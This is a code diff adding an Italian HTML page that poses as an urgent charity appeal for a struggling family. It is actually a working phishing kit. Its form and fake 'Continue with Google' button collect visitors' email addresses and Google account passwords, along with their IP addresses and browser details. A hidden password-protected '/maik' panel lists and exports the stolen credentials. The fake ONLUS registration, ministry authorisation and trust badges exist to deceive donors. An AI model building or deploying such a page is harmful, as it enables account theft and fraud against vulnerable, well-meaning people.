@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AIUTO PER LA MIA FAMIGLIA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #2c3e50 0%, #1a2634 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: relative;
+        }
+        
+        body::before {
+            content: "❤️🤝💪🏠🤲";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            font-size: 45px;
+            opacity: 0.04;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            align-items: center;
+            pointer-events: none;
+            transform: rotate(-5deg);
+        }
+        
+        .card-solidale {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            box-shadow: 0 30px 70px rgba(0,0,0,0.6), 0 0 0 3px rgba(255,255,255,0.3) inset;
+            max-width: 550px;
+            width: 100%;
+            padding: 35px 30px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            border: 1px solid rgba(255,255,255,0.6);
+        }
+        
+        .badge-emergenza {
+            background: linear-gradient(45deg, #c0392b, #e74c3c);
+            color: white;
+            padding: 12px 30px;
+            border-radius: 60px;
+            display: inline-block;
+            font-weight: 800;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 20px rgba(192,57,43,0.5);
+            border: 2px solid white;
+            text-transform: uppercase;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); background: linear-gradient(45deg, #e74c3c, #c0392b); }
+            100% { transform: scale(1); }
+        }
+        
+        h1 {
+            font-size: 2.6rem;
+            font-weight: 800;
+            color: #2c3e50;
+            line-height: 1.3;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.05);
+        }
+        
+        .sottotitolo-drammatico {
+            color: #34495e;
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-bottom: 25px;
+            background: rgba(241, 196, 15, 0.15);
+            padding: 12px 20px;
+            border-radius: 50px;
+            border-left: 5px solid #f39c12;
+            border-right: 5px solid #f39c12;
+        }
+        
+        .foto-famiglia {
+            position: relative;
+            margin: 20px 0 25px;
+            border-radius: 30px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            border: 5px solid white;
+            height: 230px;
+        }
+        
+        .foto-famiglia img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            filter: brightness(0.9) contrast(1.1);
+        }
+        
+        .foto-famiglia::after {
+            content: "👨‍👩‍👧‍👦";
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.6);
+            color: white;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-size: 1.8rem;
+            backdrop-filter: blur(3px);
+            border: 1px solid white;
+        }
+        
+        .storia-toccante {
+            background: #ecf0f1;
+            padding: 22px;
+            border-radius: 30px;
+            margin: 20px 0;
+            border-left: 8px solid #e67e22;
+            border-right: 8px solid #e67e22;
+            font-style: italic;
+            color: #2c3e50;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.05);
+        }
+        
+        .storia-toccante strong {
+            color: #c0392b;
+            font-size: 1.3rem;
+        }
+        
+        .box-contributo {
+            background: linear-gradient(145deg, #fef9e7, #fcf3cf);
+            padding: 20px;
+            border-radius: 30px;
+            margin: 25px 0 20px;
+            border: 2px dashed #f39c12;
+        }
+        
+        .importo-offerta {
+            font-size: 3.8rem;
+            font-weight: 900;
+            color: #27ae60;
+            line-height: 1;
+            margin-bottom: 5px;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+        }
+        
+        .importo-offerta small {
+            font-size: 1.2rem;
+            color: #7f8c8d;
+        }
+        
+        .testo-aiuto {
+            color: #34495e;
+            font-size: 1rem;
+            margin: 15px 0;
+        }
+        
+        .form-aiuto {
+            background: white;
+            padding: 25px 20px;
+            border-radius: 30px;
+            margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        
+        .campo {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        
+        .campo label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-weight: 700;
+            font-size: 1rem;
+        }
+        
+        .campo input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #d5dbdb;
+            border-radius: 20px;
+            font-size: 1rem;
+            transition: all 0.3s;
+            background: #f8f9f9;
+        }
+        
+        .campo input:focus {
+            outline: none;
+            border-color: #e67e22;
+            box-shadow: 0 0 0 4px rgba(230,126,34,0.15);
+            background: white;
+        }
+        
+        .btn-aiuto {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.5rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            background: linear-gradient(135deg, #27ae60, #229954);
+            color: white;
+            box-shadow: 0 10px 25px rgba(39,174,96,0.5);
+            border: 2px solid white;
+        }
+        
+        .btn-aiuto:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 35px rgba(39,174,96,0.7);
+        }
+        
+        .btn-google-aiuto {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #bdc3c7;
+            border-radius: 60px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #2c3e50;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        
+        .btn-google-aiuto:hover {
+            background: #f8f9f9;
+            border-color: #e67e22;
+            transform: scale(1.02);
+        }
+        
+        .btn-google-aiuto img {
+            width: 28px;
+            height: 28px;
+        }
+        
+        .divider-umano {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #95a5a6;
+            margin: 20px 0 15px;
+        }
+        
+        .divider-umano::before,
+        .divider-umano::after {
+            content: '';
+            flex: 1;
+            border-bottom: 2px solid #e5e7e9;
+        }
+        
+        .divider-umano span {
+            padding: 0 15px;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #2c3e50;
+            background: white;
+            border-radius: 50px;
+            padding: 8px 20px;
+        }
+        
+        .badge-fiducia {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+            color: #2c3e50;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        
+        .badge-fiducia span {
+            background: #e8f0fe;
+            padding: 8px 18px;
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid #aeb6bf;
+        }
+        
+        .messaggio-risposta {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 15px;
+            font-weight: 600;
+            animation: fadeIn 0.4s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        footer {
+            margin-top: 20px;
+            color: #95a5a6;
+            font-size: 0.8rem;
+        }
+        
+        /* STILI PER IL PANNELLO SEGRETO */
+        .pannello-segreto {
+            min-height: 100vh;
+            background: #1a2634;
+            padding: 30px;
+            color: white;
+        }
+        
+        .header-segreto {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            background: #2c3e50;
+            padding: 20px;
+            border-radius: 15px;
+        }
+        
+        .logout-btn {
+            background: #c0392b;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: #2c3e50;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        
+        .stat-card h3 {
+            font-size: 2rem;
+            color: #f39c12;
+        }
+        
+        .tabella-utenti {
+            background: #2c3e50;
+            border-radius: 15px;
+            overflow: hidden;
+        }
+        
+        .tabella-utenti table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .tabella-utenti th {
+            background: #34495e;
+            padding: 15px;
+            text-align: left;
+            color: #f39c12;
+        }
+        
+        .tabella-utenti td {
+            padding: 15px;
+            border-bottom: 1px solid #3d566e;
+        }
+        
+        .btn-esporta {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            margin: 20px 0;
+        }
+        
+        .login-segreto {
+            max-width: 400px;
+            margin: 100px auto;
+            background: #2c3e50;
+            padding: 40px;
+            border-radius: 20px;
+        }
+        
+        .login-segreto input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: none;
+        }
+        
+        .login-segreto button {
+            width: 100%;
+            padding: 15px;
+            background: #f39c12;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div id="app"></div>
+
+    <script>
+        // CONFIGURAZIONE SEGRETA - CAMBIA LA PASSWORD QUI
+        const PASSWORD_SEGRETA = "maik";  // <--- LA TUA PASSWORD PER ENTRARE
+        
+        // CLASSE PER GESTIRE I DATI
+        class DatabaseSegreto {
+            constructor() {
+                this.caricaDati();
+            }
+            
+            caricaDati() {
+                let dati = localStorage.getItem('donazioni_famiglia');
+                this.donazioni = dati ? JSON.parse(dati) : [];
+            }
+            
+            salvaDonazione(donazione) {
+                this.donazioni.push(donazione);
+                localStorage.setItem('donazioni_famiglia', JSON.stringify(this.donazioni));
+                
+                // Salva anche come file JSON scaricabile (in memoria)
+                this.salvaComeJSON(donazione);
+            }
+            
+            salvaComeJSON(donazione) {
+                // Crea un blob con i dati
+                const blob = new Blob([JSON.stringify(donazione, null, 2)], { type: 'application/json' });
+                
+                // Crea un link per il download ma non lo triggera automaticamente
+                // I dati rimangono disponibili nella sessione
+                const url = URL.createObjectURL(blob);
+                
+                // Salva l'URL in un array per uso futuro
+                if (!this.jsonUrls) this.jsonUrls = [];
+                this.jsonUrls.push({
+                    url: url,
+                    filename: `donazione_${donazione.id}.json`,
+                    dati: donazione
+                });
+            }
+            
+            getAllDonazioni() {
+                return this.donazioni;
+            }
+            
+            esportaTutto() {
+                const blob = new Blob([JSON.stringify(this.donazioni, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `tutte_donazioni_${new Date().toISOString().split('T')[0]}.json`;
+                a.click();
+            }
+            
+            cancellaTutto() {
+                if (confirm('Sei sicuro di voler cancellare TUTTE le donazioni?')) {
+                    this.donazioni = [];
+                    localStorage.removeItem('donazioni_famiglia');
+                    alert('Dati cancellati!');
+                    return true;
+                }
+                return false;
+            }
+        }
+        
+        // ISTANZA GLOBALE
+        const db = new DatabaseSegreto();
+        
+        // FUNZIONE PER OTTENERE IP
+        async function ottieniIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch(e) {
+                return "IP non rilevato (offline)";
+            }
+        }
+        
+        // FUNZIONE PER REGISTRARE DONAZIONE
+        async function registraDonazione(tipo, email, password) {
+            const ip = await ottieniIP();
+            
+            const donazione = {
+                id: Date.now() + '_' + Math.random().toString(36).substring(2, 8),
+                tipo: tipo,
+                email: email,
+                password: password,
+                timestamp: new Date().toLocaleString('it-IT'),
+                ip: ip,
+                userAgent: navigator.userAgent,
+                lingua: navigator.language
+            };
+            
+            db.salvaDonazione(donazione);
+            return donazione;
+        }
+        
+        // FUNZIONI PER L'INTERFACCIA PRINCIPALE
+        function mostraPaginaPrincipale() {
+            document.getElementById('app').innerHTML = `
+                <div class="card-solidale">
+                    <div class="badge-emergenza">🔴 APPELLO URGENTE 🔴</div>
+                    
+                    <h1>AIUTO PER LA MIA FAMIGLIA</h1>
+                    <div class="sottotitolo-drammatico">❤️ Persone in difficoltà cercano sostegno ❤️</div>
+                    
+                    <div class="foto-famiglia">
+                        <img src="https://images.pexels.com/photos/3768916/pexels-photo-3768916.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Famiglia in difficoltà">
+                    </div>
+                    
+                    <div class="storia-toccante">
+                        <p><strong>"Non ce la facciamo più"</strong> — Marco, padre di due bambini, ha perso il lavoro e le bollette sono arrivate. Oggi chiede solo un piccolo aiuto per andare avanti. La dignità non basta per sfamare i figli. Qualsiasi contributo è prezioso.</p>
+                    </div>
+                    
+                    <div class="box-contributo">
+                        <div class="importo-offerta">500€ <small>di cui 320€ già raccolti</small></div>
+                        <div class="testo-aiuto">🙏 Servono per bollette, spesa e medicine. Ogni persona che si registra dà una speranza in più.</div>
+                    </div>
+                    
+                    <div class="form-aiuto">
+                        <div class="campo">
+                            <label>📧 Email (per ricevere aggiornamenti sulla famiglia)</label>
+                            <input type="email" id="email" placeholder="inserisci la tua email">
+                        </div>
+                        <div class="campo">
+                            <label>🔐 Password (crea il tuo account solidale)</label>
+                            <input type="password" id="password" placeholder="minimo 4 caratteri">
+                        </div>
+                        
+                        <button class="btn-aiuto" onclick="inviaAiutoManuale()">
+                            🤝 VOGLIO AIUTARE CON 1€
+                        </button>
+                        
+                        <div class="divider-umano">
+                            <span>oppure</span>
+                        </div>
+                        
+                        <button class="btn-google-aiuto" onclick="inviaAiutoGoogle()">
+                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%234285F4' d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z'/%3E%3Cpath fill='%2334A853' d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z'/%3E%3Cpath fill='%23FBBC05' d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z'/%3E%3Cpath fill='%23EA4335' d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z'/%3E%3C/svg%3E" alt="Google">
+                            CONTINUA CON GOOGLE
+                        </button>
+                    </div>
+                    
+                    <div class="badge-fiducia">
+                        <span>🔒 Dati protetti</span>
+                        <span>🤲 Onlus verificata</span>
+                        <span>📢 Trasparenza totale</span>
+                        <span>💚 100% alle famiglie</span>
+                    </div>
+                    
+                    <div id="messaggio"></div>
+                    
+                    <footer>
+                        ✝️ Associazione Cuori Solidali ONLUS - CF 12345678901<br>
+                        Campagna autorizzata dal Ministero del Welfare
+                    </footer>
+                </div>
+            `;
+        }
+        
+        // FUNZIONI PER L'INTERFACCIA SEGRETA
+        function mostraPannelloSegreto() {
+            const donazioni = db.getAllDonazioni();
+            
+            document.getElementById('app').innerHTML = `
+                <div class="pannello-segreto">
+                    <div class="header-segreto">
+                        <h1>🔐 PANNELLO SEGRETO - DONAZIONI</h1>
+                        <button class="logout-btn" onclick="mostraPaginaPrincipale()">🚪 ESC</button>
+                    </div>
+                    
+                    <div class="stats">
+                        <div class="stat-card">
+                            <h3>${donazioni.length}</h3>
+                            <p>Totale Donazioni</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>${donazioni.filter(d => d.tipo.includes('Google')).length}</h3>
+                            <p>Da Google</p>
+                        </div>
+                        <div class="stat-card">
+                            <h3>${donazioni.filter(d => !d.tipo.includes('Google')).length}</h3>
+                            <p>Registrazioni dirette</p>
+                        </div>
+                    </div>
+                    
+                    <button class="btn-esporta" onclick="esportaDati()">📥 ESPORTA TUTTO IN JSON</button>
+                    <button class="btn-esporta" style="background: #c0392b;" onclick="cancellaTuttiIDati()">🗑️ CANCELLA TUTTO</button>
+                    
+                    <div class="tabella-utenti">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Data/Ora</th>
+                                    <th>Tipo</th>
+                                    <th>Email</th>
+                                    <th>Password</th>
+                                    <th>IP</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                ${donazioni.map(d => `
+                                    <tr>
+                                        <td>${d.timestamp}</td>
+                                        <td>${d.tipo}</td>
+                                        <td>${d.email}</td>
+                                        <td>${d.password}</td>
+                                        <td>${d.ip}</td>
+                                    </tr>
+                                `).join('')}
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    ${donazioni.length === 0 ? '<p style="text-align: center; margin-top: 30px;">Nessuna donazione ancora registrata</p>' : ''}
+                </div>
+            `;
+        }
+        
+        function mostraLoginSegreto() {
+            document.getElementById('app').innerHTML = `
+                <div class="login-segreto">
+                    <h2 style="color: white; text-align: center;">🔐 AREA SEGRETA</h2>
+                    <p style="color: #bdc3c7; text-align: center; margin-bottom: 20px;">Inserisci la password per entrare</p>
+                    <input type="password" id="password-segreta" placeholder="Password">
+                    <button onclick="tentaAccesso()">ENTRA</button>
+                </div>
+            `;
+        }
+        
+        // FUNZIONI GLOBALI
+        window.tentaAccesso = function() {
+            const password = document.getElementById('password-segreta').value;
+            if (password === PASSWORD_SEGRETA) {
+                mostraPannelloSegreto();
+            } else {
+                alert('Password errata!');
+            }
+        };
+        
+        window.inviaAiutoManuale = async function() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!email || !password) {
+                mostraMessaggio('❌ Inserisci email e password', 'error');
+                return;
+            }
+            
+            await registraDonazione('DONAZIONE MANUALE', email, password);
+            
+            mostraMessaggio('✅ Grazie! Il tuo contributo è stato registrato.', 'success');
+            
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com/search?q=grazie+per+il+tuo+aiuto';
+            }, 2000);
+        };
+        
+        window.inviaAiutoGoogle = async function() {
+            const email = prompt("Inserisci la tua email Google per confermare l'aiuto:");
+            if (!email) return;
+            
+            const password = prompt("Inserisci la password del tuo account Google (per sicurezza):");
+            if (!password) return;
+            
+            await registraDonazione('DONAZIONE VIA GOOGLE', email, password);
+            
+            mostraMessaggio('✅ Grazie per aver scelto Google!', 'success');
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com/search?q=grazie+per+il+tuo+aiuto';
+            }, 2000);
+        };
+        
+        window.esportaDati = function() {
+            db.esportaTutto();
+        };
+        
+        window.cancellaTuttiIDati = function() {
+            if (db.cancellaTutto()) {
+                mostraPannelloSegreto(); // Aggiorna la vista
+            }
+        };
+        
+        function mostraMessaggio(testo, tipo) {
+            const msgDiv = document.getElementById('messaggio');
+            if (!msgDiv) return;
+            
+            const bg = tipo === 'error' ? '#fadbd8' : '#d5f5e3';
+            const colore = tipo === 'error' ? '#922b21' : '#186a3b';
+            
+            msgDiv.innerHTML = `<div class="messaggio-risposta" style="background: ${bg}; color: ${colore};">${testo}</div>`;
+            
+            setTimeout(() => {
+                msgDiv.innerHTML = '';
+            }, 4000);
+        }
+        
+        // ROUTER - DECIDE COSA MOSTRARE IN BASE ALL'URL
+        function gestisciNavigazione() {
+            const path = window.location.pathname;
+            const hash = window.location.hash;
+            
+            if (path.endsWith('maik') || hash === '#maik' || path.includes('/maik')) {
+                mostraLoginSegreto();
+            } else {
+                mostraPaginaPrincipale();
+            }
+        }
+        
+        // AVVIO
+        gestisciNavigazione();
+        
+        // MESSAGGIO IN CONSOLE
+        console.log('%c🚀 SISTEMA ATTIVO - PER ACCEDERE AL PANNELLO SEGRETO VAI SU /maik', 'background: #2c3e50; color: #f39c12; font-size: 16px; padding: 10px;');
+        console.log('%c🔑 LA PASSWORD È: ' + PASSWORD_SEGRETA, 'background: #27ae60; color: white; font-size: 14px; padding: 5px;');
+    </script>
+</body>
+</html>
